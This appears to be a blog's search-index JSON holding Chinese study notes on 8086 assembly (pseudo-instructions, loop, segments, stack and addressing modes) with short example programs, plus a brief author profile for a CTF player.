（1）编写汇编源程序，产生一个文本文件(.asm)。 （2）对源程序进行编译连接，编译产生目标文件(.obj)，将目标文件进行连接，产生可执行文件（.exe）。 （3）执行可执行文件中的程序。 ","date":"2020-10-01","objectID":"/assembly-1/:4:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1一些基本概念"},{"categories":["Pwning"],"content":"2、伪指令伪指令，由编译器执行，汇编指令被编译为机器码由CPU执行。 assume cs:abc ;assume将名为abc的代码段与cs联系 abc segment ;段的开始 mov ax,2 add ax,ax add ax,ax mov ax,4c00h ;这两句代表程序返回 int 21h ;int，Debug中用p命令执行 abc ends ;段的结束 end ;程序的结束 ","date":"2020-10-01","objectID":"/assembly-1/:4:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2伪指令"},{"categories":["Pwning"],"content":"3、程序执行的跟踪command.com运行后，将程序1.exe加载入内存，command设置CPU的CS:IP指向程序的第一条指令，之后command将CPU的控制权交给程序，程序运行完成后，返回到command。 CX寄存器存放了程序长度，DS=SA,CS:IP指向SA+10H:0 空闲内存区：SA:0 PSP区：SA:0 256个字节 程序区：SA+10H:0 ","date":"2020-10-01","objectID":"/assembly-1/:4:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3程序执行的跟踪"},{"categories":["Pwning"],"content":"5、[bx]和loop指令","date":"2020-10-01","objectID":"/assembly-1/:5:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#5bx和loop指令"},{"categories":["Pwning"],"content":"1、[bx]\u0026一些基本概念（1）[bx]代表一个内存单元，其段地址在ds中，偏移地址在bx中。 （2）loop代表循环 （3）“（）”来表示一个寄存器或一个内存单元中的内容 （ax）（ds） ax，ds中的值 （20000H） 20000处内存单元的值 （（ds）*16+2） 内存单元ds：2处的值 （4）约定符号idata表示常量 ","date":"2020-10-01","objectID":"/assembly-1/:5:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1bx一些基本概念"},{"categories":["Pwning"],"content":"2、loop指令 mov cx,11 s: add ax,ax ；s为标号，代表一段地址 loop s ；（cx）=（cx）-1，若（cx）不为0，跳转至s处执行，若为0，向下执行。 在汇编源程序中，数据不能以字母开头。 在调试时，可以用g命令跳到下一条语句，也可以用p命令。 ","date":"2020-10-01","objectID":"/assembly-1/:5:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2loop指令"},{"categories":["Pwning"],"content":"3、Debug和编译器对指令的解释对于[idata]Debug将其解释为ds：idata，而编译器将其解释为idata。 ;对于编译器 mov al,[0] ;(al)=0 mov al,ds:[0] ;(al)=((ds)*16+0) mov al,[bx] ;(al)=((ds)*16+(bx)) mov al,ds:[bx] ;同上，cs，ds，ss，es称为段前缀 ","date":"2020-10-01","objectID":"/assembly-1/:5:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3debug和编译器对指令的解释"},{"categories":["Pwning"],"content":"4、一段安全的空间直接向内存空间中写入数据可能会对系统造成损害。 PC机提供了一段安全的空间0：200~0：2ff，供我们使用。 ","date":"2020-10-01","objectID":"/assembly-1/:5:4","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4一段安全的空间"},{"categories":["Pwning"],"content":"6、包含多个段的程序 assume cs:code,ds:data,ss:stack data segment dw 0123h,0456h,0789h,0abch,0defh,0cbah,0987h ;dw“define word”，定义了八个字型数据 ;dw定义的数据在数据段的最开始,即ds：0、……、ds：e data ends stack segment dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ;将这16个字的空间当作栈 stack ends code segment start: mov ax,stack mov ss,ax ;告诉CPU，stack段为栈空间 mov sp,20h ;栈空时的栈顶 mov ax,data mov ds,ax ;data段位数据段 mov bx,0 ;bx存放偏移地址 mov cx,8 s: push [bx] add bx,2 loop s mov bx,0 mov cx,8 s0: pop [bx] add bx,2 loop s0 mov ax,4c00h int 21h code ends end start ;指明程序入口在start处 ","date":"2020-10-01","objectID":"/assembly-1/:6:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#6包含多个段的程序"},{"categories":["Pwning"],"content":"7、灵活定位内存地址","date":"2020-10-01","objectID":"/assembly-1/:7:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#7灵活定位内存地址"},{"categories":["Pwning"],"content":"1、and和orand：逻辑与，可以将操作对象的相应位设为0。 or：逻辑或，可以将操作对象的相应位设为1。 and al,11011111B ;小写转大写 or bl,00100000B ;大写转小写 db 'DoNg' ;定义字节数据 ","date":"2020-10-01","objectID":"/assembly-1/:7:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1and和or"},{"categories":["Pwning"],"content":"2、[bx+idata]与数组用idata表示数组开始的位置，bx表示数组的偏移。 eg：[5+bx],[0+bx]分别表示从ds：5和ds：0开始的两个数组 [0+bx]=[bx+0]=0[bx]=[bx].0 ","date":"2020-10-01","objectID":"/assembly-1/:7:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2bxidata与数组"},{"categories":["Pwning"],"content":"3、SI和DISI,DI与bx功能相近，但不能分成两个八位寄存器。 mov ax,[bx+si] ;也可以写成这种形式 mov ax,[bx][si] ;对于[bx+si+idata]有以下几种形式 mov ax,[bx+200+si] mov ax,[200+bx+si] mov ax,200[bx][si] mov ax,[bx].200[si] mov ax,[bx][si].200 ","date":"2020-10-01","objectID":"/assembly-1/:7:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3si和di"},{"categories":["Pwning"],"content":"4、二重循环与栈的应用 ;下列程序可以实现数据段的每个单词的前四个字母变为大写 assume cs:codesg,ss:stacksg,ds:datasg datasg segment ;数据段 db '1. display ' db '2. brows ' db '3. replace ' db '4. modify ' datasg ends stacksg segment ;栈段，注意栈顶sp dw 0,0,0,0,0,0,0,0 stacksg ends codesg segment start: mov ax,stacksg mov ss,ax mov sp,16 mov ax,datasg mov ds,ax mov cx,4 ;外循环次数 mov bx,0 ;用bx代表行 s0: push cx ;外层循环数暂存入cx mov si,0 ;si代表列 mov cx,4 ;内循环数 s: mov al,ds:[bx+3+si] ;循环实现前四个字母变为大写 and al,11011111B mov ds:[bx+3+si],al inc si ;移动列 loop s pop cx ;出栈，取出外循环cx add bx+16 ;移动行 loop s0 mov ax,4c00H int 21H codesg ends end start ","date":"2020-10-01","objectID":"/assembly-1/:7:4","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4二重循环与栈的应用"},{"categories":null,"content":"CTFer \u0026 PWNer Play CTF with r3kapig！ 2021.06-2021.09 : venustech-ADLab Windows Security Researcher A student in XXX QQ：HA4TGNJQG4ZTCNA= Links： Kirin: Master of Pwn (Maybe) Sakura: Chrome Fucker (Genius) ","date":"0001-01-01","objectID":"/about/:0:0","series":null,"tags":null,"title":"About","uri":"/about/#"}]